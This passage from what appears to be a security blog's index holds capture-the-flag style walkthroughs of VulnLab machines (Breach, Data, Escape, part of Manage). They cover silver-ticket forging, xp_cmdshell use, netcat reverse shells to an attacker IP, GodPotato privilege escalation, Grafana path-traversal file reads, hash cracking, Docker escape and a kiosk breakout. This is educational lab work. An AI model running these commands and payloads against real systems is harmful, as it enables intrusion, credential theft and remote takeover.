now.</p> <pre><code>\u3009ticketer.py -nthash 69596c7aa1e8daee17f8e78870e25a5c -domain-sid S-1-5-21-2330692793-3312915120-706255856 -domain breach.vl -spn MSSQLsvc/breachdc.breach.vl:1433 Administrator\nImpacket v0.12.0.dev1+20240606.111452.d71f4662 - Copyright 2023 Fortra\n\n[*] Creating basic skeleton ticket and PAC Infos\n[*] Customizing ticket for breach.vl/Administrator\n[*]     PAC_LOGON_INFO\n[*]     PAC_CLIENT_INFO_TYPE\n[*]     EncTicketPart\n[*]     EncTGSRepPart\n[*] Signing/Encrypting final ticket\n[*]     PAC_SERVER_CHECKSUM\n[*]     PAC_PRIVSVR_CHECKSUM\n[*]     EncTicketPart\n[*]     EncTGSRepPart\n[*] Saving ticket in Administrator.ccache\n</code></pre> <p>In order to be able to use the <code>Administrator.ccache</code> file, we need to set that as the value for the <code>KRB5CCNAME</code> environment variable, using:</p> <pre><code>export KRB5CCNAME=Administrator.ccache\n</code></pre> <p>Now we can access the MSSQL service using the credential cache file. Note the <code>-k</code> and <code>-no-pass</code> arguments here. We're telling <code>mssqlclient.py</code> to use Kerberos authentication and to not prompt us for a password. </p> <pre><code>\u3009mssqlclient.py -dc-ip $ip -k -no-pass Administrator@breachdc.breach.vl\nImpacket v0.12.0.dev1+20240606.111452.d71f4662 - Copyright 2023 Fortra\n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(BREACHDC\\SQLEXPRESS): Line 1: Changed database context to 'master'.\n[*] INFO(BREACHDC\\SQLEXPRESS): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)\n[!] Press help for extra shell commands\nSQL (BREACH\\Administrator  dbo@master)&gt; \n</code></pre> <p>Perfect! We're able to enable <code>xp_cmdshell</code> using the following command from within <code>mssqlclient.py</code>:</p> <pre><code>enable_xp_cmdshell\n</code></pre> <p>If you connected using a different tool, refer to the documentation for how to enable <code>xp_cmdshell</code>. </p> <p>Now we need to get something on the machine that we can use to get a shell. There is AV on this machine, so some tools may get blocked. If you have time or just want an extra challenge, you can research developing your own custom tooling for this, but since I was doing this box during a hackathon day at work, I just used nc64.exe since I knew (or at least I thought) that id did not get flagged by Defender. We can use the following command to get <code>nc64.exe</code> onto the machine.</p> <pre><code>SQL (BREACH\\Administrator  dbo@master)&gt; xp_cmdshell powershell -c iwr http://10.8.2.86:8000/nc64.exe -outfile c:\\windows\\tasks\\nc64.exe\noutput\n------\nNULL\n</code></pre> <p>And then run it. </p> <pre><code>SQL (BREACH\\Administrator  dbo@master)&gt; xp_cmdshell c:\\windows\\tasks\\nc64.exe 10.8.2.86 9001 -e cmd.exe\n</code></pre> <p>After running that, we do get a connection back and have an interactive shell as the <code>svc_mssql</code> user. </p> <pre><code>\u3009rlwrap -cAr nc -lvnp 9001\nlistening on [any] 9001 ...\nconnect to [10.8.2.86] from (UNKNOWN) [10.10.106.145] 51494\nMicrosoft Windows [Version 10.0.20348.558]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;whoami /all\nwhoami /all\n\nUSER INFORMATION\n----------------\n\nUser Name        SID\n================ =============================================\nbreach\\svc_mssql S-1-5-21-2330692793-3312915120-706255856-1115\n\n\n[...SNIP...]\n\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                               State\n============================= ========================================= ========\nSeAssignPrimaryTokenPrivilege Replace a process level token             Disabled\nSeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled\nSeMachineAccountPrivilege     Add workstations to domain                Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled\nSeManageVolumePrivilege       Perform volume maintenance tasks          Enabled\nSeImpersonatePrivilege        Impersonate a client after authentication Enabled\nSeCreateGlobalPrivilege       Create global objects                     Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set            Disabled\n</code></pre>","tags":["silverticket","kerberoasting","smb","privilege-abuse"]},{"location":"blog/2024/06/22/vulnlab-breach.html#privilege-escalation","title":"Privilege Escalation","text":"<p>Note that the <code>svc_mssql</code> user has <code>SeImpersonatePrivilege</code> enabled. This is another exercise of getting something past defender. Ultimately, I used <code>GodPotato</code> to abuse the <code>SeImpersonatePrivilege</code>. Please note that I renamed the executable to <code>god.exe</code> from what it originally was. </p> <pre><code>C:\\Windows\\Tasks&gt;.\\god.exe -cmd \"c:\\windows\\tasks\\nc64.exe 10.8.2.86 9002 -e cmd.exe\"\n.\\god.exe -cmd \"c:\\windows\\tasks\\nc64.exe 10.8.2.86 9002 -e cmd.exe\"\n[*] CombaseModule: 0x140733742317568\n[*] DispatchTable: 0x140733744908152\n[*] UseProtseqFunction: 0x140733744200496\n[*] UseProtseqFunctionParamCount: 6\n[*] HookRPC\n[*] Start PipeServer\n[*] CreateNamedPipe \\\\.\\pipe\\c887be9a-4a1a-4d98-89f9-7df3afae38c3\\pipe\\epmapper\n[*] Trigger RPCSS\n[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046\n[*] DCOM obj IPID: 00009002-120c-ffff-9d52-59f5a25d719f\n[*] DCOM obj OXID: 0xdccf82478ef3ca4f\n[*] DCOM obj OID: 0xfe77745c6ce234f9\n[*] DCOM obj Flags: 0x281\n[*] DCOM obj PublicRefs: 0x0\n[*] Marshal Object bytes len: 100\n[*] UnMarshal Object\n[*] Pipe Connected!\n[*] CurrentUser: NT AUTHORITY\\NETWORK SERVICE\n[*] CurrentsImpersonationLevel: Impersonation\n[*] Start Search System Token\n[*] PID : 1020 Token:0x744  User: NT AUTHORITY\\SYSTEM ImpersonationLevel: Impersonation\n[*] Find System Token : True\n[*] UnmarshalObject: 0x80070776\n[*] CurrentUser: NT AUTHORITY\\SYSTEM\n[*] process start with pid 740\n</code></pre> <p>After running <code>GodPotato</code>, we get another connection back to our machine as <code>nt authority\\system</code>. </p> <p></p> <p>Now we can grab the root flag and finish the box! </p> <pre><code>C:\\Windows\\Tasks&gt;cd C:\\users\\administrator\\desktop\ncd C:\\users\\administrator\\desktop\n\nC:\\Users\\Administrator\\Desktop&gt;dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is B465-02B6\n\n Directory of C:\\Users\\Administrator\\Desktop\n\n02/17/2022  10:51 AM    &lt;DIR&gt;          .\n02/17/2022  09:35 AM    &lt;DIR&gt;          ..\n02/17/2022  10:52 AM                36 root.txt\n               1 File(s)             36 bytes\n               2 Dir(s)  11,743,375,360 bytes free\n</code></pre>","tags":["silverticket","kerberoasting","smb","privilege-abuse"]},{"location":"blog/2024/06/22/vulnlab-breach.html#references","title":"References","text":"<p>GodPotato</p>","tags":["silverticket","kerberoasting","smb","privilege-abuse"]},{"location":"blog/2024/07/04/vulnlab-data.html","title":"VulnLab: Data","text":"<p>Data is an EASY rated machine on VulnLab. This machine involves abusing an unauthenticated path traversal/file read vulnerability in a Grafana instance to get access to a database file and recover hashed credentials. Using a custom script, we can get those hashes in a format suitable for performing an offline password cracking attack with Hashcat. After recovering a plaintext credential for one of the recovered users, abuse a case of password re-use to gain access to the box as the compromised user. From there, abuse a sudo permission to get a privileged shell in a Docker container running on the system. Once inside the Docker container, we can mount the underlying file system to access the root flag. </p> <p></p>","tags":["grafana","path-traversal","sudo","docker"]},{"location":"blog/2024/07/04/vulnlab-data.html#enumeration","title":"Enumeration","text":"","tags":["grafana","path-traversal","sudo","docker"]},{"location":"blog/2024/07/04/vulnlab-data.html#nmap","title":"Nmap","text":"<p>The nmap scan shows only two ports open. </p> <pre><code>PORT     STATE SERVICE REASON         VERSION\n22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 \n3000/tcp open  ppp?    syn-ack ttl 62\n</code></pre>","tags":["grafana","path-traversal","sudo","docker"]},{"location":"blog/2024/07/04/vulnlab-data.html#service-enumeration","title":"Service Enumeration","text":"","tags":["grafana","path-traversal","sudo","docker"]},{"location":"blog/2024/07/04/vulnlab-data.html#port-3000","title":"Port 3000","text":"<p>Checking port 3000, we find a Grafana instance running on the box. </p> <p></p> <p>After a bit of research, we find that there is a pre-auth path traversal vulnerability in Grafana that allows arbitrary file read.</p> <pre><code>$ curl --path-as-is http://data.vl:3000/public/plugins/alertlist/../../../../../../../../etc/passwd\nroot:x:0:0:root:/root:/bin/ash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\nman:x:13:15:man:/usr/man:/sbin/nologin\npostmaster:x:14:12:postmaster:/var/mail:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\nat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\nsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\nxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\ncyrus:x:85:12::/usr/cyrus:/sbin/nologin\nvpopmail:x:89:89::/var/vpopmail:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\ngrafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin\n</code></pre> <p>There are a number of interesting files we can grab here, one is the Grafana database file, <code>grafana.db</code>. </p> <pre><code>$ curl --path-as-is http://data.vl:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db\n</code></pre> <p>Looking through that database file, we find some hashes. </p> <p></p> <p>I found this article with some details on cracking grafana hashes.</p> <p>I converted the script given in the article to (good enough) Python. </p> <pre><code>import hashlib\nimport base64\n\ndef calculate_hash(password, salt):\n    decoded_hash = bytes.fromhex(password)\n    salt_base64 = base64.b64encode(salt.encode('utf-8')).decode('utf-8')\n    hash_base64 = base64.b64encode(decoded_hash).decode('utf-8')\n    return f'sha256:10000:{salt_base64}:{hash_base64}'\n\n# boris\nboris_password = \"dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8\"\nboris_salt = \"LCBhdtJWjl\"\nboris_hash = calculate_hash(boris_password, boris_salt)\n\n# admin\nadmin_password = \"7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8\"\nadmin_salt = \"YObSoLj55S\"\nadmin_hash = calculate_hash(admin_password, admin_salt)\n\nprint(f\"[+] Boris hash: {boris_hash}\")\nprint(f\"[+] Admin hash: {admin_hash}\")\n\nwith open(\"hashes.txt\", \"w\") as file:\n    file.write(boris_hash + \"\\n\")\n    file.write(admin_hash + \"\\n\")\n</code></pre> <p>Once we've got the usable hashes in the <code>hashes.txt</code> file, we can move forward with cracking them with Hashcat. </p> <pre><code>$ hashcat -m 10900 hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt\n</code></pre> <p>The hash associated with the <code>boris</code> user cracked and we can recover the plaintext password. </p> <pre><code>$ cat cracked.txt\nsha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:beautiful1\n</code></pre>","tags":["grafana","path-traversal","sudo","docker"]},{"location":"blog/2024/07/04/vulnlab-data.html#foothold","title":"Foothold","text":"<p>As shown below, we can use those credentials for logging into Grafana, but there's not much we can do there, so we can check for password re-use instead. </p> <p></p> <p>Sure enough, the password is reused on the SSH service, so we can use that password to gain access to the machine as <code>boris</code>. </p> <pre><code>$ ssh boris@$ip\nThe authenticity of host '10.10.93.25 (10.10.93.25)' can't be established.\nED25519 key fingerprint is SHA256:BbRsUm7WEG5iYUbNYC9T2OejHNd7cyJddbpRjRL0bKg.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.93.25' (ED25519) to the list of known hosts.\nboris@10.10.93.25's password:\nWelcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-1060-aws x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Sun Jun 30 20:57:16 UTC 2024\n\n  System load:  0.78              Processes:              106\n  Usage of /:   19.8% of 7.69GB   Users logged in:        0\n  Memory usage: 24%               IP address for eth0:    10.10.93.25\n  Swap usage:   0%                IP address for docker0: 172.17.0.1\n\n\n0 updates can be applied immediately.\n\n\nLast login: Sun Jan 23 13:11:53 2022 from 10.10.1.254\nboris@ip-10-10-10-11:~$\n</code></pre> <p>Go ahead and grab the user flag and we can move on to escalating privileges. </p>","tags":["grafana","path-traversal","sudo","docker"]},{"location":"blog/2024/07/04/vulnlab-data.html#privilege-escalation","title":"Privilege Escalation","text":"<p>Checking <code>sudo -l</code> we find the following:</p> <pre><code>boris@ip-10-10-10-11:~$ sudo -l\nMatching Defaults entries for boris on ip-10-10-10-11:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser boris may run the following commands on ip-10-10-10-11:\n    (root) NOPASSWD: /snap/bin/docker exec *\n</code></pre> <p>One interesting thing here is that even though there is a <code>grafana</code> user listed in the <code>/etc/passwd</code> file, there is not a corresponding <code>/home/grafana</code> directory. Between that and the command we're able to run with <code>sudo</code>, we can make a guess that the <code>grafana</code> home directory is inside a Docker container. This was a bit guessy, so if anyone has a good methodology for accurately enumerating the container name without being a member of the <code>docker</code> group and with limited <code>sudo</code> permissions, please reach out and let me know.</p> <p>Checking the docker docs here we find a command we can probably use. </p> <p>Docker Docs | Exec</p> <pre><code>boris@ip-10-10-10-11:~$ sudo /snap/bin/docker exec --privileged -u 0 -it grafana /bin/sh\n/usr/share/grafana #\n</code></pre> <p>Now that we have privileged access in the container, we can mount the underlying file system. </p> <p>Docker | HackTricks</p> <p>We can check the disks with <code>fdisk -l</code>. </p> <pre><code>/opt # fdisk -l\nDisk /dev/xvda: 8192 MB, 8589934592 bytes, 16777216 sectors\n6367 cylinders, 85 heads, 31 sectors/track\nUnits: sectors of 1 * 512 = 512 bytes\n\nDevice   Boot StartCHS    EndCHS        StartLBA     EndLBA    Sectors  Size Id Type\n/dev/xvda1 *  0,32,33     20,84,31          2048   16777182   16775135 8190M 83 Linux\n</code></pre> <p>With that, we can use <code>/dev/xvda1</code> with the <code>mount</code> command to mount the filesystem in our newly created directory. </p> <pre><code>/opt # mkdir /mnt/th0m12\n\n/opt # mount /dev/xvda1 /mnt/th0m12\n\n/opt # cd /mnt/th0m12/\n\n/mnt/th0m12 # ls -la\ntotal 104\ndrwxr-xr-x   23 root     root          4096 Jun 30 20:56 .\ndrwxr-xr-x    1 root     root          4096 Jun 30 21:32 ..\ndrwxr-xr-x    2 root     root          4096 Nov 29  2021 bin\ndrwxr-xr-x    3 root     root          4096 Nov 29  2021 boot\ndrwxr-xr-x    4 root     root          4096 Nov 29  2021 dev\ndrwxr-xr-x   91 root     root          4096 Jun 30 20:56 etc\ndrwxr-xr-x    4 root     root          4096 Jan 23  2022 home\nlrwxrwxrwx    1 root     root            30 Nov 29  2021 initrd.img -&gt; boot/initrd.img-5.4.0-1060-aws\nlrwxrwxrwx    1 root     root            30 Nov 29  2021 initrd.img.old -&gt; boot/initrd.img-5.4.0-1060-aws\ndrwxr-xr-x   20 root     root          4096 Nov 29  2021 lib\ndrwxr-xr-x    2 root     root          4096 Nov 29  2021 lib64\ndrwx------    2 root     root         16384 Nov 29  2021 lost+found\ndrwxr-xr-x    2 root     root          4096 Nov 29  2021 media\ndrwxr-xr-x    2 root     root          4096 Nov 29  2021 mnt\ndrwxr-xr-x    2 root     root          4096 Nov 29  2021 opt\ndrwxr-xr-x    2 root     root          4096 Apr 24  2018 proc\ndrwx------    5 root     root          4096 Jan 23  2022 root\ndrwxr-xr-x    5 root     root          4096 Nov 29  2021 run\ndrwxr-xr-x    2 root     root          4096 Nov 29  2021 sbin\ndrwxr-xr-x    7 root     root          4096 Jan 23  2022 snap\ndrwxr-xr-x    2 root     root          4096 Nov 29  2021 srv\ndrwxr-xr-x    2 root     root          4096 Apr 24  2018 sys\ndrwxrwxrwt   11 root     root          4096 Jun 30 21:02 tmp\ndrwxr-xr-x   11 root     root          4096 Nov 29  2021 usr\ndrwxr-xr-x   13 root     root          4096 Nov 29  2021 var\nlrwxrwxrwx    1 root     root            27 Nov 29  2021 vmlinuz -&gt; boot/vmlinuz-5.4.0-1060-aws\nlrwxrwxrwx    1 root     root            27 Nov 29  2021 vmlinuz.old -&gt; boot/vmlinuz-5.4.0-1060-aws\n</code></pre> <p>Now that we have privileged access to the underlying filesystem, we can grab the <code>root.txt</code> flag from here and finish this machine. </p> <pre><code>~ # cd /mnt/th0m12/root\n/mnt/th0m12/root # ls -la\ntotal 28\ndrwx------    5 root     root          4096 Jan 23  2022 .\ndrwxr-xr-x   23 root     root          4096 Jun 30 20:56 ..\nlrwxrwxrwx    1 root     root             9 Jan 23  2022 .bash_history -&gt; /dev/null\ndrwxr-xr-x    3 root     root          4096 Jan 23  2022 .local\n-rw-r--r--    1 root     root           148 Aug 17  2015 .profile\ndrwx------    2 root     root          4096 Jan 23  2022 .ssh\n-rw-r--r--    1 root     root            37 Jan 23  2022 root.txt\ndrwxr-xr-x    4 root     root          4096 Jan 23  2022 snap\n</code></pre>","tags":["grafana","path-traversal","sudo","docker"]},{"location":"blog/2024/05/18/vulnlab-escape.html","title":"VulnLab: Escape","text":"<p>Escape is an easy rated Windows box from VulnLab. This box involved breaking out of a restricted kiosk environment, recovering an obfuscated RDP password, and finally bypassing UAC to escalate privilges. </p> <p></p>","tags":["kiosk","rdp","uac","password-deobfuscation"]},{"location":"blog/2024/05/18/vulnlab-escape.html#walkthrough","title":"Walkthrough","text":"","tags":["kiosk","rdp","uac","password-deobfuscation"]},{"location":"blog/2024/05/18/vulnlab-escape.html#enumeration","title":"Enumeration","text":"<p>Nmap shows that only port 3389 is open on the server.</p> <pre><code>Nmap scan report for 10.10.126.31\nHost is up, received echo-reply ttl 127 (0.13s latency).\nScanned at 2024-05-18 15:07:54 CDT for 315s\nNot shown: 65534 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT     STATE SERVICE       REASON          VERSION\n3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services\n| rdp-ntlm-info:\n|   Target_Name: ESCAPE\n|   NetBIOS_Domain_Name: ESCAPE\n|   NetBIOS_Computer_Name: ESCAPE\n|   DNS_Domain_Name: Escape\n|   DNS_Computer_Name: Escape\n|   Product_Version: 10.0.19041\n|_  System_Time: 2024-05-18T20:13:04+00:00\n|_ssl-date: 2024-05-18T20:13:08+00:00; -1s from scanner time.\n| ssl-cert: Subject: commonName=Escape\n| Issuer: commonName=Escape\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2024-02-02T11:08:33\n| Not valid after:  2024-08-03T11:08:33\n| MD5:   f4fa:8611:3b8a:76e2:65fe:541a:947b:4b84\n| SHA-1: 240f:ec8d:6051:8a16:92fd:9600:818a:f8c6:dbe5:bd4b\n| -----BEGIN CERTIFICATE-----\n| MIIC0DCCAbigAwIBAgIQQlhl5eFZarZNEpCItMxt3jANBgkqhkiG9w0BAQsFADAR\n| MQ8wDQYDVQQDEwZFc2NhcGUwHhcNMjQwMjAyMTEwODMzWhcNMjQwODAzMTEwODMz\n| WjARMQ8wDQYDVQQDEwZFc2NhcGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK\n| AoIBAQDRO5ErOER+vxewtaw8DXrvlXgfc5R1seKph22xCI0CaMbLswSXtruA+V8p\n| iIWLN+b0Z12z35n7o2kbJuD91T1o3FpiVGVXiRFiTT+d1CET3OYd0VqQOOaxpwfp\n| MPvFTfBnbiAhMtalXVkV/R2tYnw94hgmVBxALs7VJp/x3mwcZVkdcEfJ7g7cjpZy\n| EMD0Wcs+yYxXVdkYL6e+zPlRBNZjdaTasOAzCJ9a5xmUslhWoIInlL1coI1XD7QL\n| 5fJlIUOtr8k9RHKMJPEOS/syeWUUzSkkLzWMFqgWqnikvsS8MI1S94+N2AO7zX4W\n| rcOsSqd20W8cxWeqFlo51+/mAk+tAgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUF\n| BwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsFAAOCAQEAEPNmAPmsdJGT9Q0h\n| ugo6UcqXu/bhBYKteY4lrHH9P6MMa7rmZE5EFETmK1jp839dYldFGWCGxZ0GAJL/\n| aGpicW/ImVVyaSmzwYCXS69wRG0ll0Gu0rmj4PgeQ4KOPN45GWvqWFUepsqEMEF4\n| xSAe6igyZMGZAL7qN/px4qmc9nTLSmGp3yDgzxvRqc8d3B+I0q+i1El1e2JcfTyH\n| Wjdz3DWjHIXfyo514Ntpdnneugkpehfnnqcjy3JL+soGtrglw3RUA05+0TVgk3l7\n| MEEtnIj+jkoDw/iNEfGFswkHWJGf8ASxQohxf0BGh0o4T+Jv7+C2Jdw3szVWfAFX\n| loAYvQ==\n|_-----END CERTIFICATE-----\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 0s, deviation: 0s, median: -1s\n</code></pre> <p>Since there's no credentials, we can try to access the RDP service by disabling NLA.</p> <pre><code>$ xfreerdp /v:$ip /dynamic-resolution +clipboard -sec-nla\n</code></pre> <p>This brings up the following prompt. Looks like we can login as the <code>KioskUser0</code> without a password.</p> <p></p> <p>Once we're logged in, we are presented with sign for the <code>Busan Expo</code>. </p> <p></p>","tags":["kiosk","rdp","uac","password-deobfuscation"]},{"location":"blog/2024/05/18/vulnlab-escape.html#kiosk-breakout","title":"Kiosk Breakout","text":"<p>Right click and most commands are restricted in kiosk mode; however, we can use the Windows key to bring up the menu and select Microsoft Edge from there to get a browser with a URL bar and most functionality enabled.</p> <p>Within Edge, we can use the following in the URL bar to get a directory listing of the <code>C:\\</code> drive. </p> <pre><code>file://c:\\\n</code></pre> <p></p> <p>Within the <code>C:\\_admin</code> directory, there are a couple files that look like they're associated with the remote desktop service.</p> <p></p> <p>The <code>profiles.xml</code> looks like it has an encrypted password in it. We'll need to figure out a way to decrypt that.</p> <p></p>","tags":["kiosk","rdp","uac","password-deobfuscation"]},{"location":"blog/2024/05/18/vulnlab-escape.html#user-flag","title":"User Flag","text":"<p>We can just grab the user flag from here. </p> <p></p>","tags":["kiosk","rdp","uac","password-deobfuscation"]},{"location":"blog/2024/05/18/vulnlab-escape.html#privilege-escalation","title":"Privilege Escalation","text":"<p>To proceed, we're going to need a proper shell. Since we're fairly restricted on what we can execute, we'll need to download <code>cmd.exe</code> and then rename it to <code>msedge</code> since that's one of the only things allowed in kiosk mode.</p> <p></p> <p>After checking around a little bit it seems like we're pretty much restricted to accessing the <code>Downloads</code> folder, so we can copy the <code>profiles.xml</code> file to the <code>C:\\Users\\KioskUser0\\Downloads</code> folder and do everything from there. </p> <p></p> <p>Start up RDP plus from <code>C:\\Program Files (x86)\\Remote Desktop Plus\\rdp.exe</code>. </p> <p></p> <p>From the <code>Manage profiles</code> menu, select <code>Import profile</code> from the <code>Import and export</code> menu.</p> <p></p> <p>Select the <code>profile.xml</code> file and notice that the password is obfuscated in the edit configuration menu.</p> <p></p> <p>We can use a tool called BulletsPassView to read the obfuscated password.</p> <p></p> <p>When the tool detects an obfuscated password, it displays the plaintext password in the tool window. </p> <p>Since we've already got a shell we can just try <code>runas</code> with that password to see if it's possible to escalate to the admin user. We get a shell with the following command:</p> <pre><code>PS&gt; runas /user:ESCAPE\\admin cmd\n</code></pre> <p>After getting the new shell, we can observe that the <code>admin</code> user is a member of the <code>Administrators</code> group, however this shell is running at a medium integrity level which means we'll need to bypass UAC to get a high integrity shell. </p> <p></p> <p>Something I learned doing this lab was that it wasn't necessary to use something like <code>fodhelper</code> to bypass UAC in this case. Using the following command brought up the UAC dialog and clicking on the \"Yes\" button brings up PowerShell running as a high integrity process. </p> <pre><code>PS&gt; Start-Process powershell -Verb runas\n</code></pre> <p></p> <p>We can see that we now have all administrative privileges. </p> <p></p> <p>Now, with the high integrity PowerShell go ahead and grab the <code>root.txt</code> from the <code>C:\\Users\\Administrator\\Dekstop\\</code> directory. </p> <p>That's it! Congrats on rooting the box.</p>","tags":["kiosk","rdp","uac","password-deobfuscation"]},{"location":"blog/2024/06/28/vulnlab-manage.html","title":"VulnLab: Manage","text":"<p>Manage is an EASY machine on VulnLab. This box involved abusing a Java JMX service to get command execution on the server. Once on the server, we find a backup archive that contains files from a user's home directory that we can use to move laterally. After moving to the second user, we find that we're able to run a command as root that we can use to add a new privileged user on the system. </p> <p></p>","tags":["Java-RMI","linux","sudo"]},{"location":"blog/2024/06/28/vulnlab-manage.html#enumeration","title":"Enumeration","text":"","tags":["Java-RMI","linux","sudo"]},{"location":"blog/2024/06/28/vulnlab-manage.html#nmap","title":"Nmap","text":"<pre><code>PORT      STATE SERVICE    REASON         VERSION\n22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   256 a9:36:3d:1d:43:62:bd:b3:88:5e:37:b1:fa:bb:87:64 (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL/6LNCGTwX42XmhwON6uF7gkwKfdO4iIzYnFD87dWpXiPrNIYgfW0953r40u4j4DAf+PhgdmdKKKE8KIifQaVc=\n|   256 da:3b:11:08:81:43:2f:4c:25:42:ae:9b:7f:8c:57:98 (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGbGFCw+4cyYAXrdHnPXp2K1ojZhTcQrXPI+pDFW5vkh\n2222/tcp  open  java-rmi   syn-ack ttl 63 Java RMI\n| rmi-dumpregistry:\n|   jmxrmi\n|     javax.management.remote.rmi.RMIServerImpl_Stub\n|     @127.0.1.1:34355\n|     extends\n|       java.rmi.server.RemoteStub\n|       extends\n|_        java.rmi.server.RemoteObject\n|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)\n8080/tcp  open  http       syn-ack ttl 63 Apache Tomcat 10.1.19\n|_http-favicon: Apache Tomcat\n| http-methods:\n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-title: Apache Tomcat/10.1.19\n33337/tcp open  tcpwrapped syn-ack ttl 63\n34355/tcp open  java-rmi   syn-ack ttl 63 Java RMI\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre> <pre><code>10.10.126.113:22\n10.10.126.113:2222\n10.10.126.113:8080\n10.10.126.113:33337\n10.10.126.113:34355\n</code></pre> <p>Right off the bat, the most interesting service is the Java-RMI service on port 2222. Note the <code>jmxrmi</code> in the nmap output. According to the Oracle documentation, the Java Management Extensions (JMX) is a standard part of the Java platform that provides a simple, standard way of managing resources such as applications, devices, and services. </p> <p>Overview of JMX Technology</p> <p>Managed Beans, or MBeans, are a fundamental concept of the JMX API. The JMX specification defines five types of beans:</p> <ul> <li>Standard MBeans</li> <li>Dynamic MBeans</li> <li>Open MBeans</li> <li>Model MBeans</li> <li>MXBeans</li> </ul> <p>Introducing MBeans</p>","tags":["Java-RMI","linux","sudo"]},{"location":"blog/2024/06/28/vulnlab-manage.html#foothold","title":"Foothold","text":"","tags":["Java-RMI","linux","sudo"]},{"location":"blog/2024/06/28/vulnlab-manage.html#exploiting-java-jmxrmi","title":"Exploiting Java JMXRMI","text":"<p>We can use the Beanshooter tool to enumerate the <code>jmxrmi</code> service and ultimately exploit the service to get a foothold on the box.</p> <pre><code>\u279c  manage $ beanshooter enum $ip 2222                                                                                          \nPicked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true\n[+] Checking available bound names:\n[+]\n[+]     * jmxrmi (JMX endpoint: 127.0.1.1:44703)\n[+]\n[+] Checking for unauthorized access:\n[+]\n[+]     - Remote MBean server does not require authentication.\n[+]       Vulnerability Status: Vulnerable\n[+]\n[+] Checking pre-auth deserialization behavior:\n[+]\n[+]     - Remote MBeanServer rejected the payload class.\n[+]       Vulnerability Status: Non Vulnerable\n[+]\n[+] Checking available MBeans:\n[+]\n[+]     - 158 MBeans are currently registred on the MBean server.\n[+]       Listing 136 non default MBeans:\n[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Loader,host=localhost,context=/host-manager)\n[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=numberwriter,J2EEApplication=none,J2EEServer=none)\n[+]       - org.apache.catalina.mbeans.NamingResourcesMBean 